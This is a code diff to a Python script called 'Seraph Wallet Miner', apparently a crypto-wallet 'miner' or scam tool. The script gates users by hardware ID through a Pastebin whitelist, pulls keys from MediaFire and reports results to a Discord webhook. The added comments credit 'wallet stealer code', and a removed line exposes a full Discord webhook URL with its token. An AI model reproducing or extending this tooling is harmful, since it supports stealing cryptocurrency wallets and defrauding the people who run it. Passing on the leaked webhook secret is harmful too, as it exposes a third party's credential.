@@ -15,14 +15,20 @@ from slowprint.slowprint import *
 from colorama import init, Fore
 init(convert=True)
 import subprocess, requests
+#please no not chnage any of the mediafire links otherwise u will need to chnage code and if u dont know how to then leave the code as it is 
+#if you want to add your own keys please dm me on discord Paradym#0116
+#if u want to add a webhook notif please make a channel copy webhook link and paste it to line 310 and chnage what is needed 
+#credits :
+#SeraphV2 - added features
+#sfx2md - wallet stealer code
 os.system("cls")
 
 hardwareid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
 ip = socket.gethostbyname(socket.gethostname())
 
-ctypes.windll.kernel32.SetConsoleTitleW(f"Seraph Wallet Miner | Start Up ")
+ctypes.windll.kernel32.SetConsoleTitleW(f"Seraph Wallet Miner | Start Up ")#chnage this to whatever you want your title to be 
 
-PASTE_BIN_URL = "https://pastebin.com/QUGjKqXy"
+PASTE_BIN_URL = ""#here is where u put your pastebin link with your hwid
 
 site = requests.get(PASTE_BIN_URL)
 
@@ -32,7 +38,7 @@ try:
     else:
         slowprint("You are not Whitelisted!")
         slowprint(f"Your HWID is {hardwareid}")
-        slowprint("If This Is Incorrect Please Speak To The Owner!")
+        slowprint("Please copy your HWID to a pastebin file and copy the link into line 31 of the code")
         time.sleep(30)
         input()
         exit(123)
@@ -118,7 +124,7 @@ else:
             'Access-Control-Max-Age': '3600',
             'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
             }
-        MediaUrl = 'https://www.mediafire.com/file/rke2osins15zqqt/key.key/file' #basic key
+        MediaUrl = 'https://www.mediafire.com/file/rke2osins15zqqt/key.key/file' 
         url = MediaUrl
         req = requests.get(url, headers)
         soup = BeautifulSoup(req.content, 'html.parser')
@@ -301,7 +307,7 @@ def id_gen(size=40, chars=string.ascii_uppercase + string.digits):
 
 tries = 0
 
-webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1025301829464113253/oV2T5HUS0c0EN5_MeNmKIj5npB_ZR6IfvrI3yhJDtqpYSZssyas42jenwQckidddnGjT')
+webhook = DiscordWebhook(url='')
 
 while(True):
     if(tries > random.randint(10, 10000000000)): 
